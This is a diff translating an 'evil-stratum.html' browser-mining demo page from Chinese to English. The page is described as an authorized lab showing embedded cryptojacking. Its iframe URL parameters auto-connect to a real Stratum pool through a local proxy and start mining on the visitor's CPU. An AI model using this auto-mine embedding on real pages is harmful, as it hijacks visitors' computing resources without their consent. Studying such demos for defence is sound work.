@@ -1,9 +1,9 @@
 <!DOCTYPE html>
-<html lang="zh-CN">
+<html lang="en">
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1" />
-  <title>嵌入式 Stratum 实验（CMU）</title>
+  <title>Embedded Stratum demo (CMU)</title>
   <style>
     :root {
       --bg: #0f1419;
@@ -114,88 +114,88 @@
 </head>
 <body>
   <main>
-    <h1>嵌入式 Stratum 载荷（与 index.html 同逻辑）</h1>
-    <p class="sub">本页与上级 <code>index.html</code> 使用相同的 <code>miner-worker.js</code> + 本地 <code>stratum-proxy</code>，可放在 <strong>iframe</strong> 中演示「嵌入式 + 真 Stratum」。需要 <code>npm install</code> 后运行 <code>node stratum-proxy.js</code>。URL 参数见下方说明。</p>
+    <h1>Embedded Stratum payload (same logic as index.html)</h1>
+    <p class="sub">This page uses the same <code>miner-worker.js</code> and local <code>stratum-proxy</code> as <code>index.html</code>; load it in an <strong>iframe</strong> to demo embedded + real Stratum. Run <code>npm install</code> then <code>node stratum-proxy.js</code>. URL parameters are documented below.</p>
 
     <div class="panel">
-      <label for="workers">Worker 数量（上限 4，减轻 CPU 压力）</label>
+      <label for="workers">Workers (max 4, to reduce CPU load)</label>
       <input type="range" id="workers" min="1" max="4" value="1" />
-      <div class="stats" id="workersVal">当前：1 个 Worker</div>
+      <div class="stats" id="workersVal">Current: 1 worker(s)</div>
 
-      <label for="throttle" style="margin-top:1rem">负载限制（1 最省 CPU、10 最猛；低数值会加长批间休眠）</label>
+      <label for="throttle" style="margin-top:1rem">Throttle (1 = lightest CPU, 10 = heaviest; lower values sleep longer between batches)</label>
       <input type="range" id="throttle" min="1" max="10" value="1" />
-      <div class="stats" id="throttleVal">当前：1 / 10</div>
+      <div class="stats" id="throttleVal">Current: 1 / 10</div>
       <p class="stats" id="cpuHint" style="margin-top:0.35rem"></p>
 
       <label style="display:flex;align-items:center;gap:0.5rem;margin-top:1rem;cursor:pointer;font-size:0.9rem;color:var(--text)">
         <input type="checkbox" id="stratumAutoSubmit" checked />
-        找到有效 share 时自动 mining.submit
+        Auto mining.submit when a valid share is found
       </label>
 
       <div class="row">
-        <button type="button" id="start">开始挖矿</button>
-        <button type="button" id="stop" disabled>停止</button>
+        <button type="button" id="start">Start mining</button>
+        <button type="button" id="stop" disabled>Stop</button>
       </div>
-      <div class="stats" id="status">状态：<span class="ok">空闲</span></div>
+      <div class="stats" id="status">Status: <span class="ok">Idle</span></div>
       <div class="stats" id="live">
-        总哈希（累计）：<strong id="totalHashes">0</strong><br />
-        合计算力：<strong id="hashrate">0 H/s</strong><br />
-        有效 share 次数：<strong id="shareCount">0</strong>
+        Total hashes: <strong id="totalHashes">0</strong><br />
+        Combined hashrate: <strong id="hashrate">0 H/s</strong><br />
+        Valid shares: <strong id="shareCount">0</strong>
       </div>
       <p class="err" id="workerErr" hidden></p>
     </div>
 
     <div class="panel">
-      <h2 style="font-size:1.05rem; font-weight:600; margin:0 0 0.35rem;">连接矿池（需本地代理）</h2>
-      <p class="hint">浏览器无法直连矿池 TCP。先运行 <code>node stratum-proxy.js</code>（需 <code>npm install</code>），再连 WebSocket 与矿池，完成 subscribe / authorize，收到 <code>mining.notify</code> 后即可在上方开始挖矿。</p>
+      <h2 style="font-size:1.05rem; font-weight:600; margin:0 0 0.35rem;">Connect to pool (local proxy required)</h2>
+      <p class="hint">Browsers cannot open raw pool TCP. Run <code>node stratum-proxy.js</code> (after <code>npm install</code>), connect WebSocket to the proxy and TCP to the pool, complete subscribe / authorize, then after <code>mining.notify</code> you can start mining above.</p>
 
       <div class="stratum-grid" style="grid-template-columns:1fr;">
-        <label for="wsUrl">代理 WebSocket（勿在浏览器地址栏打开）</label>
+        <label for="wsUrl">Proxy WebSocket (do not open in the address bar)</label>
         <input type="text" id="wsUrl" class="stratum-field" value="ws://127.0.0.1:8787" autocomplete="off" />
-        <p class="hint" style="margin-top:0.35rem">请先用 <strong>http://</strong> 打开本页（如 <code>http://127.0.0.1:8080</code>），再在此框填 <code>ws://…</code> 并点「连接代理」。地址栏输入 <code>ws://</code> 会报错。</p>
+        <p class="hint" style="margin-top:0.35rem">Open this page with <strong>http://</strong> first (e.g. <code>http://127.0.0.1:8080</code>), then enter <code>ws://…</code> here and click &quot;Connect proxy&quot;. Typing <code>ws://</code> in the address bar will fail.</p>
       </div>
       <div class="row" style="margin-top:0.65rem">
-        <button type="button" id="stratumWsConnect" class="btn-muted">连接代理</button>
-        <button type="button" id="stratumWsDisconnect" class="btn-muted" disabled>断开代理</button>
+        <button type="button" id="stratumWsConnect" class="btn-muted">Connect proxy</button>
+        <button type="button" id="stratumWsDisconnect" class="btn-muted" disabled>Disconnect proxy</button>
       </div>
 
       <div class="stratum-grid">
-        <label for="poolHost">矿池主机（Stratum TCP）</label>
-        <label for="poolPort" style="grid-column:2">端口</label>
-        <input type="text" id="poolHost" class="stratum-field" placeholder="例如矿池域名" autocomplete="off" />
+        <label for="poolHost">Pool host (Stratum TCP)</label>
+        <label for="poolPort" style="grid-column:2">Port</label>
+        <input type="text" id="poolHost" class="stratum-field" placeholder="e.g. pool hostname" autocomplete="off" />
         <input type="number" id="poolPort" class="stratum-field" style="max-width:6.5rem" value="3333" min="1" max="65535" />
       </div>
       <div class="row">
-        <button type="button" id="stratumTcpConnect" class="btn-muted" disabled>连接矿池</button>
-        <button type="button" id="stratumTcpDisconnect" class="btn-muted" disabled>断开矿池</button>
+        <button type="button" id="stratumTcpConnect" class="btn-muted" disabled>Connect pool</button>
+        <button type="button" id="stratumTcpDisconnect" class="btn-muted" disabled>Disconnect pool</button>
       </div>
 
       <div class="stratum-grid" style="grid-template-columns:1fr 1fr; margin-top:1rem">
         <div>
           <label for="stratumWorker">Worker（mining.authorize）</label>
-          <input type="text" id="stratumWorker" class="stratum-field" placeholder="地址.工人名 或矿池要求格式" autocomplete="off" />
+          <input type="text" id="stratumWorker" class="stratum-field" placeholder="address.worker or pool format" autocomplete="off" />
         </div>
         <div>
-          <label for="stratumPass">密码</label>
-          <input type="text" id="stratumPass" class="stratum-field" placeholder="常见为 x" value="x" autocomplete="off" />
+          <label for="stratumPass">Password</label>
+          <input type="text" id="stratumPass" class="stratum-field" placeholder="often x" value="x" autocomplete="off" />
         </div>
       </div>
       <div class="row">
-        <button type="button" id="stratumSubscribe" class="btn-muted" disabled>发送 mining.subscribe</button>
-        <button type="button" id="stratumAuthorize" class="btn-muted" disabled>发送 mining.authorize</button>
-        <button type="button" id="stratumLogClear" class="btn-muted">清空日志</button>
+        <button type="button" id="stratumSubscribe" class="btn-muted" disabled>Send mining.subscribe</button>
+        <button type="button" id="stratumAuthorize" class="btn-muted" disabled>Send mining.authorize</button>
+        <button type="button" id="stratumLogClear" class="btn-muted">Clear log</button>
       </div>
 
-      <textarea id="stratumLog" class="stratum-log" readonly spellcheck="false" aria-label="Stratum 日志"></textarea>
+      <textarea id="stratumLog" class="stratum-log" readonly spellcheck="false" aria-label="Stratum log"></textarea>
       <p id="stratumHint"></p>
     </div>
 
     <div class="panel">
-      <p style="margin:0 0 0.5rem; font-size:0.9rem;">本页路径与 iframe：</p>
+      <p style="margin:0 0 0.5rem; font-size:0.9rem;">Path and iframe:</p>
       <ul>
-        <li>HTTP 打开：<code>http://127.0.0.1:8080/mining-demo/attack/evil-stratum.html</code>（与 index 相同，需 <code>--bind 127.0.0.1</code> 时同上）。</li>
-        <li>全自动（iframe 用）：<code>evil-stratum.html?auto=1&amp;mine=1&amp;host=stratum.braiins.com&amp;port=3333&amp;worker=子账户.矿工&amp;pass=密码</code>（凭证仅用于本机实验，勿提交到仓库）。</li>
-        <li>另开终端：<code>cd mining-demo &amp;&amp; node stratum-proxy.js</code>。</li>
+        <li>Via HTTP: <code>http://127.0.0.1:8080/mining-demo/attack/evil-stratum.html</code> (same as index; use <code>--bind 127.0.0.1</code> as needed).</li>
+        <li>Full auto (for iframe): <code>evil-stratum.html?auto=1&amp;mine=1&amp;host=stratum.braiins.com&amp;port=3333&amp;worker=subaccount.worker&amp;pass=secret</code> (credentials for local lab only; do not commit).</li>
+        <li>Another terminal: <code>cd mining-demo &amp;&amp; node stratum-proxy.js</code>.</li>
       </ul>
     </div>
   </main>
@@ -203,11 +203,11 @@
   <script src="../stratum-utils.js"></script>
   <script>
     /**
-     * URL 参数（iframe 全自动演示，仅授权实验环境）：
-     *   auto=1          连接代理 → TCP → subscribe → authorize（链式）
-     *   mine=1          在收到 mining.notify 且任务就绪后自动点「开始挖矿」
-     *   proxy/host/port/worker/pass  填表单并参与 auto
-     * 例：evil-stratum.html?auto=1&mine=1&host=stratum.braiins.com&port=3333&worker=user.w1&pass=x
+     * URL params (iframe full-auto; authorized lab only):
+     *   auto=1          chain: proxy → TCP → subscribe → authorize
+     *   mine=1          after mining.notify and job ready, auto-click Start mining
+     *   proxy/host/port/worker/pass  fill form and drive auto
+     * e.g. evil-stratum.html?auto=1&mine=1&host=stratum.braiins.com&port=3333&worker=user.w1&pass=x
      */
     const autoParams = (function () {
       const p = new URLSearchParams(location.search);
@@ -269,8 +269,8 @@
     }
 
     function syncLabels() {
-      workersVal.textContent = "当前：" + workersSlider.value + " 个 Worker";
-      throttleVal.textContent = "当前：" + throttleSlider.value + " / 10";
+      workersVal.textContent = "Current: " + workersSlider.value + " worker(s)";
+      throttleVal.textContent = "Current: " + throttleSlider.value + " / 10";
     }
     workersSlider.addEventListener("input", syncLabels);
     throttleSlider.addEventListener("input", syncLabels);
@@ -279,7 +279,7 @@
       const hc = navigator.hardwareConcurrency || 4;
       const suggest = Math.max(1, Math.floor(hc / 2));
       cpuHintEl.textContent =
-        "本机约 " + hc + " 逻辑处理器，建议 Worker ≤ " + suggest + "；卡顿请调低负载或 Worker。";
+        "About " + hc + " logical CPUs; suggest workers ≤ " + suggest + ". If it stutters, lower throttle or workers.";
     })();
 
     const workerScriptUrl = new URL("../miner-worker.js", document.baseURI || location.href).href;
@@ -300,9 +300,9 @@
         sumShares += s.shares;
       }
       const approxTotal = Array.from(perWorker.values()).reduce((a, s) => a + s.total, 0);
-      totalHashesEl.textContent = approxTotal.toLocaleString("zh-CN");
+      totalHashesEl.textContent = approxTotal.toLocaleString("en-US");
       hashrateEl.textContent = formatRate(sumRate);
-      shareCountEl.textContent = sumShares.toLocaleString("zh-CN");
+      shareCountEl.textContent = sumShares.toLocaleString("en-US");
     }
 
     function setRunning(running) {
@@ -314,9 +314,9 @@
       if (autoEl) autoEl.disabled = running;
       if (running) {
         status.innerHTML =
-          '状态：<span style="color:#f0c674">运行中（Stratum，share 目标 diff1÷difficulty）</span>';
+          'Status: <span style="color:#f0c674">Running (Stratum, share target diff1÷difficulty)</span>';
       } else {
-        status.innerHTML = '状态：<span class="ok">空闲</span>';
+        status.innerHTML = 'Status: <span class="ok">Idle</span>';
         stratumMiningActive = false;
       }
       if (!running) {
@@ -363,7 +363,7 @@
 
     function startStratumWorkersOnly(count, throttle) {
       const size = stratumState.extranonce2Size | 0;
-      if (size < 1 || size > 32) throw new Error("无效的 extranonce2_size，请重新 subscribe");
+      if (size < 1 || size > 32) throw new Error("Invalid extranonce2_size; subscribe again.");
 
       for (let i = 0; i < count; i++) {
         const w = new Worker(workerScriptUrl);
@@ -371,8 +371,8 @@
         w.onerror = function (err) {
           workerErr.hidden = false;
           workerErr.textContent =
-            "Worker 错误（若直接双击打开 HTML，请改用本地 HTTP 服务）：" +
-            (err.message || "无法加载脚本");
+            "Worker error (if you opened the HTML by double-click, use a local HTTP server instead): " +
+            (err.message || "Failed to load script");
         };
         w.postMessage({
           cmd: "startStratum",
@@ -479,7 +479,7 @@
       if (!stratumJobReady()) {
         workerErr.hidden = false;
         workerErr.textContent =
-          "任务未就绪：请先连接矿池并完成 subscribe、authorize，且已收到 mining.notify。";
+          "Job not ready: connect to the pool, complete subscribe and authorize, and receive mining.notify.";
         return;
       }
       stratumMiningActive = true;
@@ -518,7 +518,7 @@
       }
     });
 
-    /* ---- Stratum 演示（经本地 stratum-proxy.js）---- */
+    /* ---- Stratum demo (via local stratum-proxy.js) ---- */
     const stratumWsConnect = document.getElementById("stratumWsConnect");
     const stratumWsDisconnect = document.getElementById("stratumWsDisconnect");
     const stratumTcpConnect = document.getElementById("stratumTcpConnect");
@@ -560,19 +560,19 @@
           const jobId = j.params[0];
           const prev = j.params[1];
           const tail = prev && prev.length > 14 ? prev.slice(0, 14) + "…" : prev;
-          return `mining.notify：job_id=${jobId}，prevhash 前缀 ${tail}`;
+          return `mining.notify: job_id=${jobId}, prevhash prefix ${tail}`;
         }
         if (j.method === "mining.set_difficulty" && j.params && j.params[0] != null) {
-          return "mining.set_difficulty：" + j.params[0];
+          return "mining.set_difficulty: " + j.params[0];
         }
         if (j.result && Array.isArray(j.result) && j.result.length >= 2) {
           const en = j.result[1];
           if (typeof en === "string" && en.length) {
-            return "subscribe 响应：extranonce1=" + en + "（长度 " + en.length / 2 + " 字节 hex）";
+            return "subscribe response: extranonce1=" + en + " (" + en.length / 2 + " bytes hex)";
           }
         }
         if (j.error) {
-          return "错误：" + JSON.stringify(j.error);
+          return "error: " + JSON.stringify(j.error);
         }
       } catch (_) {}
       return "";
@@ -592,7 +592,7 @@
           autoParams.enabled &&
           data.ok &&
           (data.message || "").indexOf("TCP") !== -1 &&
-          (data.message || "").indexOf("已连接") !== -1
+          (data.message || "").indexOf("connected") !== -1
         ) {
           setTimeout(function () {
             stratumSendLine({
@@ -632,12 +632,12 @@
       try {
         stratumWs = new WebSocket(url);
       } catch (e) {
-        appendStratumLog("· ", "WebSocket 创建失败：" + (e.message || e));
+        appendStratumLog("· ", "WebSocket failed to create: " + (e.message || e));
         return;
       }
       updateStratumButtons();
       stratumWs.onopen = () => {
-        appendStratumLog("· ", "已连接本地代理 " + url);
+        appendStratumLog("· ", "Connected to local proxy " + url);
         updateStratumButtons();
         if (autoParams.enabled && autoParams.host && stratumWs && stratumWs.readyState === WebSocket.OPEN) {
           stratumWs.send(
@@ -650,13 +650,13 @@
         }
       };
       stratumWs.onclose = () => {
-        appendStratumLog("· ", "与代理的 WebSocket 已关闭");
+        appendStratumLog("· ", "WebSocket to proxy closed");
         stratumWs = null;
         stratumSetHint("");
         updateStratumButtons();
       };
       stratumWs.onerror = () => {
-        appendStratumLog("· ", "WebSocket 错误（代理是否已启动？）");
+        appendStratumLog("· ", "WebSocket error (is the proxy running?)");
       };
       stratumWs.onmessage = onStratumWsMessage;
     });
@@ -696,7 +696,7 @@
       const user = (stratumWorkerInput.value || "").trim();
       const pass = (stratumPassInput.value || "").trim();
       if (!user) {
-        stratumSetHint("请填写 Worker 再 authorize。");
+        stratumSetHint("Enter worker name before authorize.");
         return;
       }
       stratumSendLine({
